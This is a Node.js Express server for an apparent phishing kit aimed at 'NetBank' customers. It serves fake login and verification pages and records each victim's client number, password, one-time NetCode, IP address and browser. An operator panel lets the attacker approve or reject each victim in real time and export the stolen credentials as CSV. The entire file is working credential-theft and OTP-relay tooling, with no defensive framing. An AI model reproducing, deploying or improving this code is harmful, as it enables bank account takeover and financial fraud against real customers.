/* ----------  DEPENDENCIES  ---------- */
const express = require('express');
const cors    = require('cors');
const crypto  = require('crypto');
const session = require('cookie-session');

/* ----------  CONFIG  ---------- */
const PANEL_USER     = process.env.PANEL_USER  || 'admin';
const PANEL_PASS     = process.env.PANEL_PASS  || 'changeme';
const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex');

const app  = express();
const PORT = process.env.PORT || 3000;

console.log('ENV check:', { PANEL_USER, PANEL_PASS });

/* ----------  SIMPLE EVENT BUS  ---------- */
const events = new (require('events')).EventEmitter();
function emitPanelUpdate() { events.emit('panel'); }

// Trust proxy
app.set('trust proxy', 1);

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Session middleware
app.use(session({
  name: 'pan_sess',
  keys: [SESSION_SECRET],
  maxAge: 24 * 60 * 60 * 1000,
  sameSite: 'lax',
  secure: false,
  httpOnly: true
}));

/* ----------  STATE  ---------- */
const sessionsMap     = new Map();
const sessionActivity = new Map();
const approvedSessions = new Map();
const auditLog        = [];
let victimCounter     = 0;
let successfulLogins  = 0;
let currentDomain     = '';

/* ----------  PANEL ROUTES ---------- */

app.get('/manage', (req, res) => {
  console.log('Manage access:', { authed: req.session?.authed });
  if (req.session?.authed === true) return res.sendFile(__dirname + '/_panel.html');
  res.sendFile(__dirname + '/access.html');
});

app.post('/manage/login', (req, res) => {
  const { user, pw } = req.body;
  console.log('Login attempt:', user);
  if (user === PANEL_USER && pw === PANEL_PASS) {
    req.session = { authed: true, username: user };
    return res.redirect(302, '/manage');
  }
  res.redirect(302, '/manage?fail=1');
});

app.post('/manage/logout', (req, res) => { 
  req.session = null; 
  res.redirect(302, '/manage'); 
});

app.get('/_panel.html', (req, res) => res.redirect(302, '/manage'));
app.get('/panel.html', (req, res) => res.redirect(302, '/manage'));
app.get('/panel', (req, res) => res.redirect(302, '/manage'));
app.get('/admin', (req, res) => res.redirect(302, '/manage'));

/* ----------  STATIC ROUTES ---------- */
app.use(express.static(__dirname));

/* ----------  VICTIM PAGE ROUTES ---------- */
app.get('/', (req, res) => res.sendFile(__dirname + '/index.html'));
app.get('/verify.html', (req, res) => res.sendFile(__dirname + '/verify.html'));
app.get('/success.html', (req, res) => res.sendFile(__dirname + '/success.html'));

/* ----------  DOMAIN HELPER ---------- */
app.use((req, res, next) => {
  const host  = req.headers.host || req.hostname;
  const proto = req.headers['x-forwarded-proto'] || req.protocol;
  currentDomain = host.includes('localhost') ? `http://localhost:${PORT}` : `${proto}://${host}`;
  next();
});

/* ----------  UA PARSER ---------- */
function uaParser(ua) {
  const u = { browser: {}, os: {} };
  if (/Windows NT/.test(ua)) u.os.name = 'Windows';
  if (/Android/.test(ua)) u.os.name = 'Android';
  if (/iPhone|iPad/.test(ua)) u.os.name = 'iOS';
  if (/Linux/.test(ua) && !/Android/.test(ua)) u.os.name = 'Linux';
  if (/Chrome\/(\d+)/.test(ua)) u.browser.name = 'Chrome';
  if (/Firefox\/(\d+)/.test(ua)) u.browser.name = 'Firefox';
  if (/Safari\/(\d+)/.test(ua) && !/Chrome/.test(ua)) u.browser.name = 'Safari';
  if (/Edge\/(\d+)/.test(ua)) u.browser.name = 'Edge';
  return u;
}

/* ----------  SESSION HEADER HELPER ---------- */
function getSessionHeader(v) {
  if (v.status === 'approved') return `✅ CBA Login Approved`;
  if (v.page === 'index.html') {
    return v.entered ? `✅ Received Client + Password` : '⏳ Awaiting Client + Password';
  } else if (v.page === 'verify.html') {
    return v.otp ? `✅ Received NetCode` : `🔑 Awaiting NetCode...`;
  }
  return `⏳ Waiting...`;
}

function cleanupSession(sid, reason, silent = false) {
  const v = sessionsMap.get(sid);
  if (!v) return;
  sessionsMap.delete(sid);
  sessionActivity.delete(sid);
}

function approveSession(sid) {
  const v = sessionsMap.get(sid);
  if (!v) return;
  
  v.approvedAt = Date.now();
  v.status = 'approved';
  approvedSessions.set(sid, v);
  
  sessionsMap.delete(sid);
  sessionActivity.delete(sid);
  
  successfulLogins++;
  emitPanelUpdate();
}

/* ----------  VICTIM API ---------- */
app.post('/api/session', async (req, res) => {
  try {
    const sid = crypto.randomUUID();
    const ip  = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
    const ua  = req.headers['user-agent'] || 'n/a';
    const now = new Date();
    const dateStr = now.toLocaleString();

    victimCounter++;
    const victim = {
      sid, ip, ua, dateStr,
      entered: false, email: '', password: '', otp: '',
      page: 'index.html',
      platform: uaParser(ua).os?.name || 'n/a',
      browser: uaParser(ua).browser?.name || 'n/a',
      status: 'loaded', victimNum: victimCounter,
      activityLog: [{ time: Date.now(), action: 'CONNECTED', detail: 'Visitor connected to NetBank' }]
    };
    sessionsMap.set(sid, victim);
    sessionActivity.set(sid, Date.now());
    res.json({ sid });
  } catch (err) {
    console.error('Session creation error', err);
    res.status(500).json({ error: 'Failed to create session' });
  }
});

app.post('/api/ping', (req, res) => {
  const { sid } = req.body;
  if (sid && sessionsMap.has(sid)) {
    sessionActivity.set(sid, Date.now());
    return res.sendStatus(200);
  }
  res.sendStatus(404);
});

// Login - Client number and password
app.post('/api/login', async (req, res) => {
  try {
    const { sid, email, password } = req.body;
    if (!email?.trim() || !password?.trim()) return res.sendStatus(400);
    if (!sessionsMap.has(sid)) return res.sendStatus(404);
    const v = sessionsMap.get(sid);
    v.entered = true; 
    v.email = email; 
    v.password = password;
    v.status = 'wait';
    sessionActivity.set(sid, Date.now());

    v.activityLog = v.activityLog || [];
    v.activityLog.push({ time: Date.now(), action: 'ENTERED CREDENTIALS', detail: `Client: ${email}` });

    auditLog.push({ t: Date.now(), victimN: v.victimNum, sid, email, password, ip: v.ip, ua: v.ua });
    emitPanelUpdate();
    res.sendStatus(200);
  } catch (err) {
    console.error('Login error', err);
    res.status(500).send('Error');
  }
});

// Verify - NetCode/OTP
app.post('/api/otp', async (req, res) => {
  try {
    const { sid, otp } = req.body;
    if (!otp?.trim()) return res.sendStatus(400);
    if (!sessionsMap.has(sid)) return res.sendStatus(404);
    const v = sessionsMap.get(sid);
    v.otp = otp; 
    v.status = 'wait';
    sessionActivity.set(sid, Date.now());

    v.activityLog = v.activityLog || [];
    v.activityLog.push({ time: Date.now(), action: 'ENTERED NETCODE', detail: `NetCode: ${otp}` });

    const entry = auditLog.find(e => e.sid === sid);
    if (entry) entry.otp = otp;
    emitPanelUpdate();
    res.sendStatus(200);
  } catch (err) {
    console.error('OTP error', err);
    res.status(500).send('Error');
  }
});

// Page tracking
app.post('/api/page', async (req, res) => {
  try {
    const { sid, page } = req.body;
    if (!sessionsMap.has(sid)) return res.sendStatus(404);
    const v = sessionsMap.get(sid);
    const oldPage = v.page;
    v.page = page;
    sessionActivity.set(sid, Date.now());

    v.activityLog = v.activityLog || [];
    v.activityLog.push({ time: Date.now(), action: 'PAGE CHANGE', detail: `${oldPage} → ${page}` });

    res.sendStatus(200);
  } catch (err) {
    console.error('Page change error', err);
    res.status(500).send('Error');
  }
});

app.get('/api/status/:sid', (req, res) => {
  const v = sessionsMap.get(req.params.sid);
  if (!v) return res.json({ status: 'gone' });
  res.json({ status: v.status, page: v.page });
});

/* ----------  PANEL API ---------- */
app.get('/api/user', (req, res) => {
  if (req.session?.authed) return res.json({ username: req.session.username || PANEL_USER });
  res.status(401).json({ error: 'Not authenticated' });
});

function buildPanelPayload() {
  const activeList = Array.from(sessionsMap.values()).map(v => ({
    sid: v.sid, victimNum: v.victimNum, header: getSessionHeader(v), page: v.page, status: v.status,
    email: v.email, password: v.password, otp: v.otp,
    ip: v.ip, platform: v.platform, browser: v.browser, ua: v.ua, dateStr: v.dateStr,
    entered: v.entered,
    activityLog: v.activityLog || []
  }));
  
  const approvedList = Array.from(approvedSessions.values())
    .sort((a, b) => b.approvedAt - a.approvedAt)
    .map(v => ({
      sid: v.sid, victimNum: v.victimNum, header: getSessionHeader(v), page: v.page, status: v.status,
      email: v.email, password: v.password, otp: v.otp,
      ip: v.ip, platform: v.platform, browser: v.browser, ua: v.ua, dateStr: v.dateStr,
      entered: v.entered, approvedAt: v.approvedAt,
      activityLog: v.activityLog || []
    }));
  
  return {
    domain: currentDomain,
    username: PANEL_USER,
    totalVictims: victimCounter,
    active: activeList.length,
    waiting: activeList.filter(x => x.status === 'wait').length,
    success: successfulLogins,
    sessions: activeList,
    approvedSessions: approvedList,
    logs: auditLog.slice(-50).reverse()
  };
}

app.get('/api/panel', (req, res) => {
  if (!req.session?.authed) return res.status(401).json({ error: 'Not authenticated' });

  const listener = () => res.json(buildPanelPayload());
  events.once('panel', listener);
  setTimeout(() => {
    events.removeListener('panel', listener);
    res.json(buildPanelPayload());
  }, 1000);
});

app.post('/api/panel', async (req, res) => {
  if (!req.session?.authed) return res.status(401).json({ error: 'Not authenticated' });

  const { action, sid } = req.body;
  
  if (approvedSessions.has(sid)) {
    if (action === 'delete') {
      approvedSessions.delete(sid);
      successfulLogins = Math.max(0, successfulLogins - 1);
      emitPanelUpdate();
      return res.json({ ok: true });
    }
    return res.json({ ok: false, error: 'Session already approved' });
  }
  
  const v = sessionsMap.get(sid);
  if (!v) return res.status(404).json({ ok: false });

  switch (action) {
    case 'redo':
      if (v.page === 'index.html') {
        v.status = 'redo'; v.entered = false; v.email = ''; v.password = '';
      } else if (v.page === 'verify.html') {
        v.status = 'redo'; v.otp = '';
      }
      break;
    case 'cont':
      v.status = 'ok';
      if (v.page === 'index.html') v.page = 'verify.html';
      else if (v.page === 'verify.html') { 
        v.page = 'success'; 
        approveSession(sid);
        return res.json({ ok: true });
      }
      break;
    case 'delete':
      cleanupSession(sid, 'deleted from panel');
      emitPanelUpdate();
      break;
  }
  res.json({ ok: true });
});

/* ----------  CSV EXPORT ---------- */
app.get('/api/export', (req, res) => {
  if (!req.session?.authed) return res.status(401).send('Unauthorized');

  const successes = auditLog
    .filter(r => r.otp)
    .map(r => ({
      victimNum: r.victimN,
      email: r.email,
      password: r.password,
      otp: r.otp,
      ip: r.ip,
      ua: r.ua,
      timestamp: new Date(r.t).toISOString()
    }));

  const csv = [
    ['Victim#','Client Number','Password','NetCode','IP','UA','Timestamp'],
    ...successes.map(s=>Object.values(s).map(v=>`"${v}"`))
  ].map(r=>r.join(',')).join('\n');

  res.setHeader('Content-Type', 'text/csv');
  res.setHeader('Content-Disposition', 'attachment; filename="successful_logins.csv"');
  res.send(csv);
});

/* ----------  START ---------- */
app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Panel user: ${PANEL_USER}`);
  currentDomain = process.env.RAILWAY_STATIC_URL || process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
});
